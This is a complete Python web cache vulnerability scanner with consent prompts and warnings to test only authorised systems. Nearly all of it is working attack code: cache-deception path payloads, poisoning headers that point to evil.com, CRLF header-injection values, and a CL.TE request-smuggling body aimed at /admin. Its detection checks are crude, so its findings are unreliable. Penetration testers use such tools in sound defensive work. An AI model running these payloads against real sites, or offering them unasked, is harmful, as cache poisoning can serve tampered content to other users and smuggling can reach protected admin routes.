#!/usr/bin/env python3
"""
Web Cache Deception & Poisoning Scanner
For ethical security testing only - use only on systems you own or have permission to test
"""

import requests
import urllib.parse
import time
import hashlib
import random
import string
import argparse
from datetime import datetime
import json
import re
from colorama import init, Fore, Style

init(autoreset=True)

class CacheVulnerabilityScanner:
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.verbose = verbose
        self.results = {
            'cache_deception': [],
            'cache_poisoning': [],
            'cache_headers': {},
            'vulnerable': False
        }
        
        # Common cache deception payloads
        self.deception_payloads = [
            '/../style.css',
            '/../test.jpg',
            '/../static/test.css',
            '/..;/style.css',
            '/%2e%2e/style.css',
            '/../favicon.ico',
            '/../robots.txt',
            '/test.css',
            '/nonexistent.jpg',
            '/.css',
            '/.jpg',
            '/;.css',
            '/;.jpg',
            '/%0d%0atest.css',
            '/../../../static/test.css'
        ]
        
        # Cache poisoning headers to test
        self.poison_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Forwarded-Port': '443',
            'X-Forwarded-Scheme': 'https://evil.com',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'X-Forwarded-Server': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-For': 'evil.com',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Protocol': 'https',
            'X-Forwarded-Ssl': 'on',
            'X-Url-Scheme': 'https',
            'Cache-Control': 'public, max-age=31536000',
            'Pragma': 'no-cache',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,*/*',
            'Upgrade-Insecure-Requests': '1',
            'X-Custom-IP-Authorization': '127.0.0.1',
            'X-Forward-For': 'evil.com',
            'Content-Type': 'text/html',
            'Content-Length': '0',
            'Transfer-Encoding': 'chunked',
            'X-Original-Host': 'evil.com',
            'X-Wap-Profile': 'http://evil.com/wap.xml',
            'Profile': 'http://evil.com/profile',
            'X-Arbitrary': 'evil.com',
            'X-HTTP-DestinationURL': 'evil.com',
            'X-Forwarded-Proto-Version': 'evil.com',
            'Destination': 'evil.com'
        }
    
    def print_banner(self):
        """Print scanner banner"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}Web Cache Vulnerability Scanner")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}Target: {self.target_url}")
        print(f"{Fore.GREEN}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.CYAN}{'='*60}\n")
    
    def check_cache_headers(self, response):
        """Check for cache-related headers"""
        cache_headers = {}
        headers_to_check = [
            'Cache-Control', 'Pragma', 'Expires', 'ETag', 'Last-Modified',
            'X-Cache', 'X-Cache-Status', 'CF-Cache-Status', 'X-Varnish',
            'Age', 'Via', 'X-Cache-Hits', 'X-Served-By', 'X-Cache-Key'
        ]
        
        for header in headers_to_check:
            if header in response.headers:
                cache_headers[header] = response.headers[header]
        
        return cache_headers
    
    def test_cache_deception(self):
        """Test for web cache deception vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*] Testing for Cache Deception Vulnerabilities...")
        
        # First, get a baseline response
        try:
            baseline = self.session.get(self.target_url, timeout=10)
            baseline_length = len(baseline.content)
            baseline_hash = hashlib.md5(baseline.content).hexdigest()
        except Exception as e:
            print(f"{Fore.RED}[-] Error getting baseline: {str(e)}")
            return
        
        for payload in self.deception_payloads:
            test_url = self.target_url + payload
            
            if self.verbose:
                print(f"{Fore.BLUE}[*] Testing: {test_url}")
            
            try:
                # First request (should cache if vulnerable)
                response1 = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                # Check if response seems cacheable
                cache_headers = self.check_cache_headers(response1)
                
                if response1.status_code == 200:
                    # Second request (from different session to check cache)
                    new_session = requests.Session()
                    response2 = new_session.get(test_url, timeout=10, allow_redirects=False)
                    
                    # Check if content matches original page (potential deception)
                    if len(response2.content) > baseline_length * 0.8:  # 80% similar size
                        content_hash = hashlib.md5(response2.content).hexdigest()
                        
                        if content_hash == baseline_hash or self.check_content_similarity(baseline.content, response2.content):
                            vuln_info = {
                                'url': test_url,
                                'payload': payload,
                                'status_code': response1.status_code,
                                'cache_headers': cache_headers,
                                'content_match': content_hash == baseline_hash
                            }
                            self.results['cache_deception'].append(vuln_info)
                            print(f"{Fore.RED}[!] Potential Cache Deception: {test_url}")
                            print(f"{Fore.RED}    Cache Headers: {cache_headers}")
                
                time.sleep(0.5)  # Be nice to the server
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.CYAN}[-] Error testing {test_url}: {str(e)}")
    
    def test_cache_poisoning(self):
        """Test for web cache poisoning vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*] Testing for Cache Poisoning Vulnerabilities...")
        
        # Generate unique marker for detection
        poison_marker = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        for header_name, header_value in self.poison_headers.items():
            if 'evil.com' in str(header_value):
                header_value = header_value.replace('evil.com', f'evil{poison_marker}.com')
            
            if self.verbose:
                print(f"{Fore.BLUE}[*] Testing header: {header_name}: {header_value}")
            
            try:
                # Request with poisoned header
                headers = {header_name: header_value}
                response1 = self.session.get(self.target_url, headers=headers, timeout=10)
                
                # Check if poison marker appears in response
                if poison_marker in response1.text:
                    # Verify with clean request
                    clean_response = requests.get(self.target_url, timeout=10)
                    
                    if poison_marker in clean_response.text:
                        vuln_info = {
                            'header': header_name,
                            'value': header_value,
                            'marker_found': True,
                            'cache_headers': self.check_cache_headers(response1)
                        }
                        self.results['cache_poisoning'].append(vuln_info)
                        print(f"{Fore.RED}[!] Potential Cache Poisoning via {header_name}")
                        print(f"{Fore.RED}    Poison marker found in cached response!")
                
                # Test for response splitting
                split_headers = {
                    header_name: f"{header_value}\r\nX-Injected: true"
                }
                split_response = self.session.get(self.target_url, headers=split_headers, timeout=10)
                
                if 'X-Injected' in split_response.headers:
                    print(f"{Fore.RED}[!] Header Injection possible via {header_name}")
                
                time.sleep(0.5)
                
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.CYAN}[-] Error testing {header_name}: {str(e)}")
    
    def test_cache_key_injection(self):
        """Test for cache key injection vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*] Testing for Cache Key Injection...")
        
        # Test different parameter pollution techniques
        test_params = [
            ('test', 'value'),
            ('utm_source', 'evil'),
            ('callback', 'alert'),
            ('_', str(int(time.time()))),
            ('cb', random.randint(1000, 9999))
        ]
        
        for param_name, param_value in test_params:
            test_url = f"{self.target_url}?{param_name}={param_value}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                cache_headers = self.check_cache_headers(response)
                
                if cache_headers and 'public' in cache_headers.get('Cache-Control', ''):
                    print(f"{Fore.YELLOW}[*] Parameter {param_name} included in cache key")
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.CYAN}[-] Error: {str(e)}")
    
    def check_content_similarity(self, content1, content2):
        """Check if two responses are similar"""
        # Simple similarity check based on content length
        len1, len2 = len(content1), len(content2)
        if len1 == 0 or len2 == 0:
            return False
        
        similarity = min(len1, len2) / max(len1, len2)
        return similarity > 0.9  # 90% similar
    
    def test_http_request_smuggling(self):
        """Test for request smuggling that could lead to cache poisoning"""
        print(f"\n{Fore.YELLOW}[*] Testing for HTTP Request Smuggling...")
        
        # CL.TE smuggling test
        smuggle_body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
        headers = {
            'Content-Length': str(len(smuggle_body)),
            'Transfer-Encoding': 'chunked'
        }
        
        try:
            response = self.session.post(self.target_url, headers=headers, data=smuggle_body, timeout=10)
            if 'admin' in response.text.lower() or response.status_code in [401, 403]:
                print(f"{Fore.RED}[!] Potential Request Smuggling vulnerability detected!")
        except:
            pass
    
    def scan(self):
        """Run all cache vulnerability tests"""
        self.print_banner()
        
        # Get initial cache headers
        try:
            initial_response = self.session.get(self.target_url, timeout=10)
            self.results['cache_headers'] = self.check_cache_headers(initial_response)
            
            if self.results['cache_headers']:
                print(f"{Fore.GREEN}[+] Cache Headers Found:")
                for header, value in self.results['cache_headers'].items():
                    print(f"    {header}: {value}")
            else:
                print(f"{Fore.YELLOW}[-] No cache headers found")
        except Exception as e:
            print(f"{Fore.RED}[-] Error accessing target: {str(e)}")
            return
        
        # Run tests
        self.test_cache_deception()
        self.test_cache_poisoning()
        self.test_cache_key_injection()
        self.test_http_request_smuggling()
        
        # Summary
        self.print_summary()
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}Scan Summary")
        print(f"{Fore.CYAN}{'='*60}")
        
        if self.results['cache_deception']:
            print(f"{Fore.RED}[!] Cache Deception Vulnerabilities: {len(self.results['cache_deception'])}")
            for vuln in self.results['cache_deception']:
                print(f"    - {vuln['url']}")
            self.results['vulnerable'] = True
        
        if self.results['cache_poisoning']:
            print(f"{Fore.RED}[!] Cache Poisoning Vulnerabilities: {len(self.results['cache_poisoning'])}")
            for vuln in self.results['cache_poisoning']:
                print(f"    - Header: {vuln['header']}")
            self.results['vulnerable'] = True
        
        if not self.results['vulnerable']:
            print(f"{Fore.GREEN}[+] No cache vulnerabilities detected")
        
        # Save results
        self.save_results()
    
    def save_results(self):
        """Save scan results to JSON file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"cache_scan_{urllib.parse.quote(self.target_url.replace('://', '_'), safe='')}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Results saved to: {filename}")

def main():
    parser = argparse.ArgumentParser(
        description='Web Cache Vulnerability Scanner',
        epilog='Use responsibly and only on systems you own or have permission to test.'
    )
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout (seconds)')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    # Warning
    print(f"{Fore.YELLOW}[!] WARNING: Use this tool only on systems you own or have explicit permission to test!")
    print(f"{Fore.YELLOW}[!] Unauthorized testing may be illegal and unethical.")
    response = input(f"\n{Fore.CYAN}Do you have permission to test {args.url}? (yes/no): ")
    
    if response.lower() != 'yes':
        print(f"{Fore.RED}Exiting...")
        return
    
    # Run scanner
    scanner = CacheVulnerabilityScanner(args.url, verbose=args.verbose)
    scanner.scan()

if __name__ == '__main__':
    main()